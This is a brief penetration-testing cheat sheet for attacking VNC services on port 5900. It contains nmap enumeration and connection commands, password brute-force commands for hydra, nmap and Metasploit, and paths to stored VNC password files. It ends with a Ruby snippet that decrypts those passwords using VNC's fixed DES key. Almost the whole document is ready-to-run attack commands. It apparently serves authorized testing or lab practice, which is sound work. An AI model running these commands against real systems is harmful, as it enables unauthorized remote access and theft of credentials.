# VNC (5900)

!!! tip "Start here"
    Use `nmap` to identify the RFB security types, then test a no-authentication connection if the server advertises one. Password attempts may be rate-limited or blacklisted by the server.

---

## Enumeration

```bash
nmap -p 5900-5910 --script vnc-info $IP
```

VNC can run on multiple displays, 5900 is display :0, 5901 is :1, etc. Scan the range.

---

## Connect

```bash
vncviewer $IP
vncviewer $IP:1       # display :1, normally TCP 5901
vncviewer $IP::5901   # explicit TCP port
```

---

## Brute Force

```bash
hydra -P passwords.txt vnc://$IP
```

```bash
nmap -p 5900 --script vnc-brute $IP
```

Via Metasploit:

```bash
use auxiliary/scanner/vnc/vnc_login
set RHOSTS $IP
set PASS_FILE passwords.txt
run
```

## Credential Locations

If you have shell access on the target, VNC passwords are stored obfuscated (DES, fixed key) and are trivially decryptable:

```bash
# Common locations
~/.vnc/passwd
/root/.vnc/passwd
/home/*/.vnc/passwd
```

Decrypt with:

```bash
msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt(File.read('/root/.vnc/passwd'), fixedkey).unpack('Z*').first
```
